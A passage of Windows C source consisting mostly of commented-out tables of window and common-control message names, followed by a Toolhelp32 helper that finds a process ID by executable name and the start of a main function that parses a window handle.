    "WM_MENUDRAG",              // 0x0123 
    "WM_MENUGETOBJECT",         // 0x0124 
    "WM_UNINITMENUPOPUP",       // 0x0125 
    "WM_MENUCOMMAND",           // 0x0126 
    "WM_CHANGEUISTATE",         // 0x0127 
    "WM_UPDATEUISTATE",         // 0x0128 
    "WM_QUERYUISTATE",          // 0x0129 

    NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0130 
    NULL,
    "WM_LBTRACKPOINT",          // 0x0131 
    "WM_CTLCOLORMSGBOX",        // 0x0132 
    "WM_CTLCOLOREDIT",          // 0x0133 
    "WM_CTLCOLORLISTBOX",       // 0x0134 
    "WM_CTLCOLORBTN",           // 0x0135 
    "WM_CTLCOLORDLG",           // 0x0136 
    "WM_CTLCOLORSCROLLBAR",     // 0x0137 
    "WM_CTLCOLORSTATIC",        // 0x0138 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0140 - Win32 Comboboxes 
    "CB_GETEDITSEL",            // 0x0140 
    "CB_LIMITTEXT",             // 0x0141 
    "CB_SETEDITSEL",            // 0x0142 
    "CB_ADDSTRING",             // 0x0143 
    "CB_DELETESTRING",          // 0x0144 
    "CB_DIR",                   // 0x0145 
    "CB_GETCOUNT",              // 0x0146 
    "CB_GETCURSEL",             // 0x0147 
    "CB_GETLBTEXT",             // 0x0148 
    "CB_GETLBTEXTLEN",          // 0x0149 
    "CB_INSERTSTRING",          // 0x014a 
    "CB_RESETCONTENT",          // 0x014b 
    "CB_FINDSTRING",            // 0x014c 
    "CB_SELECTSTRING",          // 0x014d 
    "CB_SETCURSEL",             // 0x014e 
    "CB_SHOWDROPDOWN",          // 0x014f 

    "CB_GETITEMDATA",           // 0x0150 
    "CB_SETITEMDATA",           // 0x0151 
    "CB_GETDROPPEDCONTROLRECT", // 0x0152 
    "CB_SETITEMHEIGHT",         // 0x0153 
    "CB_GETITEMHEIGHT",         // 0x0154 
    "CB_SETEXTENDEDUI",         // 0x0155 
    "CB_GETEXTENDEDUI",         // 0x0156 
    "CB_GETDROPPEDSTATE",       // 0x0157 
    "CB_FINDSTRINGEXACT",       // 0x0158 
    "CB_SETLOCALE",             // 0x0159 
    "CB_GETLOCALE",             // 0x015a 
    "CB_GETTOPINDEX",           // 0x015b 
    "CB_SETTOPINDEX",           // 0x015c 
    "CB_GETHORIZONTALEXTENT",   // 0x015d 
    "CB_SETHORIZONTALEXTENT",   // 0x015e 
    "CB_GETDROPPEDWIDTH",       // 0x015f 

    "CB_SETDROPPEDWIDTH",       // 0x0160 
    "CB_INITSTORAGE",           // 0x0161 
    NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0170 - Win32 Static controls 
    "STM_SETICON",              // 0x0170 
    "STM_GETICON",              // 0x0171 
    "STM_SETIMAGE",             // 0x0172 
    "STM_GETIMAGE",             // 0x0173 
    NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0180 - Win32 Listboxes 
    "LB_ADDSTRING",             // 0x0180 
    "LB_INSERTSTRING",          // 0x0181 
    "LB_DELETESTRING",          // 0x0182 
    "LB_SELITEMRANGEEX",        // 0x0183 
    "LB_RESETCONTENT",          // 0x0184 
    "LB_SETSEL",                // 0x0185 
    "LB_SETCURSEL",             // 0x0186 
    "LB_GETSEL",                // 0x0187 
    "LB_GETCURSEL",             // 0x0188 
    "LB_GETTEXT",               // 0x0189 
    "LB_GETTEXTLEN",            // 0x018a 
    "LB_GETCOUNT",              // 0x018b 
    "LB_SELECTSTRING",          // 0x018c 
    "LB_DIR",                   // 0x018d 
    "LB_GETTOPINDEX",           // 0x018e 
    "LB_FINDSTRING",            // 0x018f 

    "LB_GETSELCOUNT",           // 0x0190 
    "LB_GETSELITEMS",           // 0x0191 
    "LB_SETTABSTOPS",           // 0x0192 
    "LB_GETHORIZONTALEXTENT",   // 0x0193 
    "LB_SETHORIZONTALEXTENT",   // 0x0194 
    "LB_SETCOLUMNWIDTH",        // 0x0195 
    "LB_ADDFILE",               // 0x0196 
    "LB_SETTOPINDEX",           // 0x0197 
    "LB_GETITEMRECT",           // 0x0198 
    "LB_GETITEMDATA",           // 0x0199 
    "LB_SETITEMDATA",           // 0x019a 
    "LB_SELITEMRANGE",          // 0x019b 
    "LB_SETANCHORINDEX",        // 0x019c 
    "LB_GETANCHORINDEX",        // 0x019d 
    "LB_SETCARETINDEX",         // 0x019e 
    "LB_GETCARETINDEX",         // 0x019f 

    "LB_SETITEMHEIGHT",         // 0x01a0 
    "LB_GETITEMHEIGHT",         // 0x01a1 
    "LB_FINDSTRINGEXACT",       // 0x01a2 
    "LB_CARETON",               // 0x01a3 
    "LB_CARETOFF",              // 0x01a4 
    "LB_SETLOCALE",             // 0x01a5 
    "LB_GETLOCALE",             // 0x01a6 
    "LB_SETCOUNT",              // 0x01a7 
    "LB_INITSTORAGE",           // 0x01a8 
    "LB_ITEMFROMPOINT",         // 0x01a9 
    NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x01B0 
    NULL, NULL,
    "LB_GETLISTBOXINFO",         // 0x01b2 
    NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x01C0 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x01D0 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x01E0 
    NULL,
    "MN_GETHMENU",              // 0x01E1 
    NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x01F0 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    "WM_MOUSEMOVE",             // 0x0200 
    "WM_LBUTTONDOWN",           // 0x0201 
    "WM_LBUTTONUP",             // 0x0202 
    "WM_LBUTTONDBLCLK",         // 0x0203 
    "WM_RBUTTONDOWN",           // 0x0204 
    "WM_RBUTTONUP",             // 0x0205 
    "WM_RBUTTONDBLCLK",         // 0x0206 
    "WM_MBUTTONDOWN",           // 0x0207 
    "WM_MBUTTONUP",             // 0x0208 
    "WM_MBUTTONDBLCLK",         // 0x0209 
    "WM_MOUSEWHEEL",            // 0x020A 
    "WM_XBUTTONDOWN",           // 0x020B 
    "WM_XBUTTONUP",             // 0x020C 
    "WM_XBUTTONDBLCLK",         // 0x020D 
    "WM_MOUSEHWHEEL",           // 0x020E 
    NULL,

    "WM_PARENTNOTIFY",          // 0x0210 
    "WM_ENTERMENULOOP",         // 0x0211 
    "WM_EXITMENULOOP",          // 0x0212 
    "WM_NEXTMENU",              // 0x0213 
    "WM_SIZING",
    "WM_CAPTURECHANGED",
    "WM_MOVING", NULL,
    "WM_POWERBROADCAST",
    "WM_DEVICECHANGE", NULL, NULL, NULL, NULL, NULL, NULL,

    "WM_MDICREATE",             // 0x0220 
    "WM_MDIDESTROY",            // 0x0221 
    "WM_MDIACTIVATE",           // 0x0222 
    "WM_MDIRESTORE",            // 0x0223 
    "WM_MDINEXT",               // 0x0224 
    "WM_MDIMAXIMIZE",           // 0x0225 
    "WM_MDITILE",               // 0x0226 
    "WM_MDICASCADE",            // 0x0227 
    "WM_MDIICONARRANGE",        // 0x0228 
    "WM_MDIGETACTIVE",          // 0x0229 

    "WM_DROPOBJECT",
    "WM_QUERYDROPOBJECT",
    "WM_BEGINDRAG",
    "WM_DRAGLOOP",
    "WM_DRAGSELECT",
    "WM_DRAGMOVE",

    // 0x0230
    "WM_MDISETMENU",            // 0x0230 
    "WM_ENTERSIZEMOVE",         // 0x0231 
    "WM_EXITSIZEMOVE",          // 0x0232 
    "WM_DROPFILES",             // 0x0233 
    "WM_MDIREFRESHMENU", NULL, NULL, NULL,
    // 0x0238
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0240 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0250 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0260 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0280 
    NULL,
    "WM_IME_SETCONTEXT",        // 0x0281 
    "WM_IME_NOTIFY",            // 0x0282 
    "WM_IME_CONTROL",           // 0x0283 
    "WM_IME_COMPOSITIONFULL",   // 0x0284 
    "WM_IME_SELECT",            // 0x0285 
    "WM_IME_CHAR",              // 0x0286 
    NULL,
    "WM_IME_REQUEST",           // 0x0288 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    "WM_IME_KEYDOWN",           // 0x0290 
    "WM_IME_KEYUP",             // 0x0291 
    NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x02a0 
    "WM_NCMOUSEHOVER",          // 0x02A0 
    "WM_MOUSEHOVER",            // 0x02A1 
    "WM_NCMOUSELEAVE",          // 0x02A2 
    "WM_MOUSELEAVE",            // 0x02A3 
    NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    "WM_WTSSESSION_CHANGE",     // 0x02B1 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x02c0 
    "WM_TABLET_FIRST",          // 0x02c0 
    "WM_TABLET_FIRST+1",        // 0x02c1 
    "WM_TABLET_FIRST+2",        // 0x02c2 
    "WM_TABLET_FIRST+3",        // 0x02c3 
    "WM_TABLET_FIRST+4",        // 0x02c4 
    "WM_TABLET_FIRST+5",        // 0x02c5 
    "WM_TABLET_FIRST+7",        // 0x02c6 
    "WM_TABLET_FIRST+8",        // 0x02c7 
    "WM_TABLET_FIRST+9",        // 0x02c8 
    "WM_TABLET_FIRST+10",       // 0x02c9 
    "WM_TABLET_FIRST+11",       // 0x02ca 
    "WM_TABLET_FIRST+12",       // 0x02cb 
    "WM_TABLET_FIRST+13",       // 0x02cc 
    "WM_TABLET_FIRST+14",       // 0x02cd 
    "WM_TABLET_FIRST+15",       // 0x02ce 
    "WM_TABLET_FIRST+16",       // 0x02cf 
    "WM_TABLET_FIRST+17",       // 0x02d0 
    "WM_TABLET_FIRST+18",       // 0x02d1 
    "WM_TABLET_FIRST+19",       // 0x02d2 
    "WM_TABLET_FIRST+20",       // 0x02d3 
    "WM_TABLET_FIRST+21",       // 0x02d4 
    "WM_TABLET_FIRST+22",       // 0x02d5 
    "WM_TABLET_FIRST+23",       // 0x02d6 
    "WM_TABLET_FIRST+24",       // 0x02d7 
    "WM_TABLET_FIRST+25",       // 0x02d8 
    "WM_TABLET_FIRST+26",       // 0x02d9 
    "WM_TABLET_FIRST+27",       // 0x02da 
    "WM_TABLET_FIRST+28",       // 0x02db 
    "WM_TABLET_FIRST+29",       // 0x02dc 
    "WM_TABLET_FIRST+30",       // 0x02dd 
    "WM_TABLET_FIRST+31",       // 0x02de 
    "WM_TABLET_LAST",           // 0x02df 

    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    "WM_CUT",                   // 0x0300 
    "WM_COPY",
    "WM_PASTE",
    "WM_CLEAR",
    "WM_UNDO",
    "WM_RENDERFORMAT",
    "WM_RENDERALLFORMATS",
    "WM_DESTROYCLIPBOARD",
    "WM_DRAWCLIPBOARD",
    "WM_PAINTCLIPBOARD",
    "WM_VSCROLLCLIPBOARD",
    "WM_SIZECLIPBOARD",
    "WM_ASKCBFORMATNAME",
    "WM_CHANGECBCHAIN",
    "WM_HSCROLLCLIPBOARD",
    "WM_QUERYNEWPALETTE",       // 0x030f

    "WM_PALETTEISCHANGING",
    "WM_PALETTECHANGED",
    "WM_HOTKEY",                // 0x0312 
    "WM_POPUPSYSTEMMENU",       // 0x0313 
    NULL, NULL, NULL,
    "WM_PRINT",                 // 0x0317 
    "WM_PRINTCLIENT",           // 0x0318 
    "WM_APPCOMMAND",            // 0x0319 
    "WM_THEMECHANGED",          // 0x031A 
    NULL, NULL,
    "WM_CLIPBOARDUPDATE",       // 0x031D 
    "WM_DWMCOMPOSITIONCHANGED", // 0x031E 
    "WM_DWMNCRENDERINGCHANGED", // 0x031F 

    "WM_DWMCOLORIZATIONCOLORCHANGED", // 0x0320 
    "WM_DWMWINDOWMAXIMIZEDCHANGE", // 0x0321 
    NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    "WM_GETTITLEBARINFOEX",     // 0x033F 

    // 0x0340 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    // 0x0350 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    "WM_HANDHELDFIRST",     // 0x0358 
    "WM_HANDHELDFIRST+1",   // 0x0359 
    "WM_HANDHELDFIRST+2",   // 0x035A 
    "WM_HANDHELDFIRST+3",   // 0x035B 
    "WM_HANDHELDFIRST+4",   // 0x035C 
    "WM_HANDHELDFIRST+5",   // 0x035D 
    "WM_HANDHELDFIRST+6",   // 0x035E 
    "WM_HANDHELDLAST",      // 0x035F 

    "WM_QUERYAFXWNDPROC",   //  0x0360 WM_AFXFIRST 
    "WM_SIZEPARENT",        //  0x0361 
    "WM_SETMESSAGESTRING",  //  0x0362 
    "WM_IDLEUPDATECMDUI",   //  0x0363 
    "WM_INITIALUPDATE",     //  0x0364 
    "WM_COMMANDHELP",       //  0x0365 
    "WM_HELPHITTEST",       //  0x0366 
    "WM_EXITHELPMODE",      //  0x0367 
    "WM_RECALCPARENT",      //  0x0368 
    "WM_SIZECHILD",         //  0x0369 
    "WM_KICKIDLE",          //  0x036A 
    "WM_QUERYCENTERWND",    //  0x036B 
    "WM_DISABLEMODAL",      //  0x036C 
    "WM_FLOATSTATUS",       //  0x036D 
    "WM_ACTIVATETOPLEVEL",  //  0x036E 
    "WM_QUERY3DCONTROLS",   //  0x036F 
    NULL,NULL,NULL,
    "WM_SOCKET_NOTIFY",     //  0x0373 
    "WM_SOCKET_DEAD",       //  0x0374 
    "WM_POPMESSAGESTRING",  //  0x0375 
    "WM_OCC_LOADFROMSTREAM",     // 0x0376 
    "WM_OCC_LOADFROMSTORAGE",    // 0x0377 
    "WM_OCC_INITNEW",            // 0x0378 
    "WM_QUEUE_SENTINEL",         // 0x0379 
    "WM_OCC_LOADFROMSTREAM_EX",  // 0x037A 
    "WM_OCC_LOADFROMSTORAGE_EX", // 0x037B 

    NULL,NULL,NULL,
    "WM_AFXLAST",               // 0x037F 

    "WM_PENWINFIRST",           // 0x0380 
    "WM_RCRESULT",              // 0x0381 
    "WM_HOOKRCRESULT",          // 0x0382 
    "WM_GLOBALRCCHANGE",        // 0x0383 
    "WM_SKB",                   // 0x0384 
    "WM_HEDITCTL",              // 0x0385 
    NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    "WM_PENWINLAST",            // 0x038F 

    "WM_COALESCE_FIRST",        // 0x0390 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    "WM_COALESCE_LAST",         // 0x039F 

    // 0x03a0 
    "MM_JOY1MOVE",
    "MM_JOY2MOVE",
    "MM_JOY1ZMOVE",
    "MM_JOY2ZMOVE",
                            NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x03b0 
    NULL, NULL, NULL, NULL, NULL,
    "MM_JOY1BUTTONDOWN",
    "MM_JOY2BUTTONDOWN",
    "MM_JOY1BUTTONUP",
    "MM_JOY2BUTTONUP",
    "MM_MCINOTIFY",       // 0x03B9 
                NULL,
    "MM_WOM_OPEN",        // 0x03BB 
    "MM_WOM_CLOSE",       // 0x03BC 
    "MM_WOM_DONE",        // 0x03BD 
    "MM_WIM_OPEN",        // 0x03BE 
    "MM_WIM_CLOSE",       // 0x03BF 

    // 0x03c0 
    "MM_WIM_DATA",        // 0x03C0 
    "MM_MIM_OPEN",        // 0x03C1 
    "MM_MIM_CLOSE",       // 0x03C2 
    "MM_MIM_DATA",        // 0x03C3 
    "MM_MIM_LONGDATA",    // 0x03C4 
    "MM_MIM_ERROR",       // 0x03C5 
    "MM_MIM_LONGERROR",   // 0x03C6 
    "MM_MOM_OPEN",        // 0x03C7 
    "MM_MOM_CLOSE",       // 0x03C8 
    "MM_MOM_DONE",        // 0x03C9 
    "MM_MOM_POSITIONCB",  // 0x03CA 
    "MM_MCISIGNAL",       // 0x03CB 
    "MM_MIM_MOREDATA",    // 0x03CC 
                                  NULL, NULL, NULL,

    "MM_MIXM_LINE_CHANGE",
    "MM_MIXM_CONTROL_CHANGE",
                NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,


    "WM_DDE_INITIATE",  // 0x3E0 
    "WM_DDE_TERMINATE", // 0x3E1 
    "WM_DDE_ADVISE",    // 0x3E2 
    "WM_DDE_UNADVISE",  // 0x3E3 
    "WM_DDE_ACK",       // 0x3E4 
    "WM_DDE_DATA",      // 0x3E5 
    "WM_DDE_REQUEST",   // 0x3E6 
    "WM_DDE_POKE",      // 0x3E7 
    "WM_DDE_EXECUTE",   // 0x3E8 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    "WM_USER"                  
};


#define SPY_MAX_LVMMSGNUM   182
static const char * const LVMMessageTypeNames[SPY_MAX_LVMMSGNUM + 1] =
{
    "LVM_GETBKCOLOR",          
    "LVM_SETBKCOLOR",
    "LVM_GETIMAGELIST",
    "LVM_SETIMAGELIST",
    "LVM_GETITEMCOUNT",
    "LVM_GETITEMA",
    "LVM_SETITEMA",
    "LVM_INSERTITEMA",
    "LVM_DELETEITEM",
    "LVM_DELETEALLITEMS",
    "LVM_GETCALLBACKMASK",
    "LVM_SETCALLBACKMASK",
    "LVM_GETNEXTITEM",
    "LVM_FINDITEMA",
    "LVM_GETITEMRECT",
    "LVM_SETITEMPOSITION",
    "LVM_GETITEMPOSITION",
    "LVM_GETSTRINGWIDTHA",
    "LVM_HITTEST",
    "LVM_ENSUREVISIBLE",
    "LVM_SCROLL",
    "LVM_REDRAWITEMS",
    "LVM_ARRANGE",
    "LVM_EDITLABELA",
    "LVM_GETEDITCONTROL",
    "LVM_GETCOLUMNA",
    "LVM_SETCOLUMNA",
    "LVM_INSERTCOLUMNA",
    "LVM_DELETECOLUMN",
    "LVM_GETCOLUMNWIDTH",
    "LVM_SETCOLUMNWIDTH",
    "LVM_GETHEADER",
    NULL,
    "LVM_CREATEDRAGIMAGE",
    "LVM_GETVIEWRECT",
    "LVM_GETTEXTCOLOR",
    "LVM_SETTEXTCOLOR",
    "LVM_GETTEXTBKCOLOR",
    "LVM_SETTEXTBKCOLOR",
    "LVM_GETTOPINDEX",
    "LVM_GETCOUNTPERPAGE",
    "LVM_GETORIGIN",
    "LVM_UPDATE",
    "LVM_SETITEMSTATE",
    "LVM_GETITEMSTATE",
    "LVM_GETITEMTEXTA",
    "LVM_SETITEMTEXTA",
    "LVM_SETITEMCOUNT",
    "LVM_SORTITEMS",
    "LVM_SETITEMPOSITION32",
    "LVM_GETSELECTEDCOUNT",
    "LVM_GETITEMSPACING",
    "LVM_GETISEARCHSTRINGA",
    "LVM_SETICONSPACING",
    "LVM_SETEXTENDEDLISTVIEWSTYLE",
    "LVM_GETEXTENDEDLISTVIEWSTYLE",
    "LVM_GETSUBITEMRECT",
    "LVM_SUBITEMHITTEST",
    "LVM_SETCOLUMNORDERARRAY",
    "LVM_GETCOLUMNORDERARRAY",
    "LVM_SETHOTITEM",
    "LVM_GETHOTITEM",
    "LVM_SETHOTCURSOR",
    "LVM_GETHOTCURSOR",
    "LVM_APPROXIMATEVIEWRECT",
    "LVM_SETWORKAREAS",
    "LVM_GETSELECTIONMARK",
    "LVM_SETSELECTIONMARK",
    "LVM_SETBKIMAGEA",
    "LVM_GETBKIMAGEA",
    "LVM_GETWORKAREAS",
    "LVM_SETHOVERTIME",
    "LVM_GETHOVERTIME",
    "LVM_GETNUMBEROFWORKAREAS",
    "LVM_SETTOOLTIPS",
    "LVM_GETITEMW",
    "LVM_SETITEMW",
    "LVM_INSERTITEMW",
    "LVM_GETTOOLTIPS",
    NULL,
    NULL,
    NULL,
    NULL,
    "LVM_FINDITEMW",
    NULL,
    NULL,
    NULL,
    "LVM_GETSTRINGWIDTHW",
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    "LVM_GETCOLUMNW",
    "LVM_SETCOLUMNW",
    "LVM_INSERTCOLUMNW",
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    "LVM_GETITEMTEXTW",
    "LVM_SETITEMTEXTW",
    "LVM_GETISEARCHSTRINGW",
    "LVM_EDITLABELW",
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    "LVM_SETBKIMAGEW",
    "LVM_GETBKIMAGEW",   
    "LVM_SETSELECTEDCOLUMN",
    "LVM_SETTILEWIDTH",
    "LVM_SETVIEW",
    "LVM_GETVIEW",
    NULL,
    "LVM_INSERTGROUP",
    NULL,
    "LVM_SETGROUPINFO",
    NULL,
    "LVM_GETGROUPINFO",
    "LVM_REMOVEGROUP",
    "LVM_MOVEGROUP",
    NULL,
    NULL,
    "LVM_MOVEITEMTOGROUP",
    "LVM_SETGROUPMETRICS",
    "LVM_GETGROUPMETRICS",
    "LVM_ENABLEGROUPVIEW",
    "LVM_SORTGROUPS",
    "LVM_INSERTGROUPSORTED",
    "LVM_REMOVEALLGROUPS",
    "LVM_HASGROUP",
    "LVM_SETTILEVIEWINFO",
    "LVM_GETTILEVIEWINFO",
    "LVM_SETTILEINFO",
    "LVM_GETTILEINFO",
    "LVM_SETINSERTMARK",
    "LVM_GETINSERTMARK",
    "LVM_INSERTMARKHITTEST",
    "LVM_GETINSERTMARKRECT",
    "LVM_SETINSERTMARKCOLOR",
    "LVM_GETINSERTMARKCOLOR",
    NULL,
    "LVM_SETINFOTIP",
    "LVM_GETSELECTEDCOLUMN",
    "LVM_ISGROUPVIEWENABLED",
    "LVM_GETOUTLINECOLOR",
    "LVM_SETOUTLINECOLOR",
    NULL,
    "LVM_CANCELEDITLABEL",
    "LVM_MAPINDEXTOID",
    "LVM_MAPIDTOINDEX",
    "LVM_ISITEMVISIBLE"
};


#define SPY_MAX_TVMSGNUM   65
static const char * const TVMessageTypeNames[SPY_MAX_TVMSGNUM + 1] =
{
    "TVM_INSERTITEMA",        
    "TVM_DELETEITEM",
    "TVM_EXPAND",
    NULL,
    "TVM_GETITEMRECT",
    "TVM_GETCOUNT",
    "TVM_GETINDENT",
    "TVM_SETINDENT",
    "TVM_GETIMAGELIST",
    "TVM_SETIMAGELIST",
    "TVM_GETNEXTITEM",
    "TVM_SELECTITEM",
    "TVM_GETITEMA",
    "TVM_SETITEMA",
    "TVM_EDITLABELA",
    "TVM_GETEDITCONTROL",
    "TVM_GETVISIBLECOUNT",
    "TVM_HITTEST",
    "TVM_CREATEDRAGIMAGE",
    "TVM_SORTCHILDREN",
    "TVM_ENSUREVISIBLE",
    "TVM_SORTCHILDRENCB",
    "TVM_ENDEDITLABELNOW",
    "TVM_GETISEARCHSTRINGA",
    "TVM_SETTOOLTIPS",
    "TVM_GETTOOLTIPS",
    "TVM_SETINSERTMARK",
    "TVM_SETITEMHEIGHT",
    "TVM_GETITEMHEIGHT",
    "TVM_SETBKCOLOR",
    "TVM_SETTEXTCOLOR",
    "TVM_GETBKCOLOR",
    "TVM_GETTEXTCOLOR",
    "TVM_SETSCROLLTIME",
    "TVM_GETSCROLLTIME",
    "TVM_UNKNOWN35",
    "TVM_UNKNOWN36",
    "TVM_SETINSERTMARKCOLOR",
    "TVM_GETINSERTMARKCOLOR",
    "TVM_GETITEMSTATE",
    "TVM_SETLINECOLOR",
    "TVM_GETLINECOLOR",
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    "TVM_INSERTITEMW",
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    "TVM_GETITEMW",
    "TVM_SETITEMW",
    "TVM_GETISEARCHSTRINGW",
    "TVM_EDITLABELW"
};


#define SPY_MAX_HDMMSGNUM   19
static const char * const HDMMessageTypeNames[SPY_MAX_HDMMSGNUM + 1] =
{
    "HDM_GETITEMCOUNT",         
    "HDM_INSERTITEMA",
    "HDM_DELETEITEM",
    "HDM_GETITEMA",
    "HDM_SETITEMA",
    "HDM_LAYOUT",
    "HDM_HITTEST",
    "HDM_GETITEMRECT",
    "HDM_SETIMAGELIST",
    "HDM_GETIMAGELIST",
    "HDM_INSERTITEMW",
    "HDM_GETITEMW",
    "HDM_SETITEMW",
    NULL,
    NULL,
    "HDM_ORDERTOINDEX",
    "HDM_CREATEDRAGIMAGE",
    "GETORDERARRAYINDEX",
    "SETORDERARRAYINDEX",
    "SETHOTDIVIDER"
};


#define SPY_MAX_TCMMSGNUM   62
static const char * const TCMMessageTypeNames[SPY_MAX_TCMMSGNUM + 1] =
{
    NULL,             
    NULL,
    "TCM_SETIMAGELIST",
    "TCM_GETIMAGELIST",
    "TCM_GETITEMCOUNT",
    "TCM_GETITEMA",
    "TCM_SETITEMA",
    "TCM_INSERTITEMA",
    "TCM_DELETEITEM",
    "TCM_DELETEALLITEMS",
    "TCM_GETITEMRECT",
    "TCM_GETCURSEL",
    "TCM_SETCURSEL",
    "TCM_HITTEST",
    "TCM_SETITEMEXTRA",
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    "TCM_ADJUSTRECT",
    "TCM_SETITEMSIZE",
    "TCM_REMOVEIMAGE",
    "TCM_SETPADDING",
    "TCM_GETROWCOUNT",
    "TCM_GETTOOLTIPS",
    "TCM_SETTOOLTIPS",
    "TCM_GETCURFOCUS",
    "TCM_SETCURFOCUS",
    "TCM_SETMINTABWIDTH",
    "TCM_DESELECTALL",
    "TCM_HIGHLIGHTITEM",
    "TCM_SETEXTENDEDSTYLE",
    "TCM_GETEXTENDEDSTYLE",
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    "TCM_GETITEMW",
    "TCM_SETITEMW",
    "TCM_INSERTITEMW"
};

#define SPY_MAX_PGMMSGNUM   13
static const char * const PGMMessageTypeNames[SPY_MAX_PGMMSGNUM + 1] =
{
    NULL,              
    "PGM_SETCHILD",
    "PGM_RECALCSIZE",
    "PGM_FORWARDMOUSE",
    "PGM_SETBKCOLOR",
    "PGM_GETBKCOLOR",
    "PGM_SETBORDER",
    "PGM_GETBORDER",
    "PGM_SETPOS",
    "PGM_GETPOS",
    "PGM_SETBUTTONSIZE",
    "PGM_GETBUTTONSIZE",
    "PGM_GETBUTTONSTATE",
    "PGM_GETDROPTARGET"
};


#define SPY_MAX_CCMMSGNUM   9
static const char * const CCMMessageTypeNames[SPY_MAX_CCMMSGNUM + 1] =
{
    NULL,              
    "CCM_SETBKCOLOR",
    "CCM_SETCOLORSCHEME",
    "CCM_GETCOLORSCHEME",
    "CCM_GETDROPTARGET",
    "CCM_SETUNICODEFORMAT",
    "CCM_GETUNICODEFORMAT",
    "CCM_SETVERSION",
    "CCM_GETVERSION",
    "CCM_SETNOTIFYWINDOW"
};
*/

#define NUM_XMSGS ARRAYSIZE(xmsglist)

DWORD name2pid(LPWSTR ImageName) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          dwPid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if (lstrcmpi(ImageName, pe32.szExeFile)==0) {
          dwPid = pe32.th32ProcessID;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    
    return dwPid;
}

// 
int main(int argc, char *argv[]) {
    int   i;
    HWND  hwnd;
    BYTE  buffer[64];
    DWORD len;
    
    hwnd = (HWND)strtoul(argv[1], NULL, 16);
    
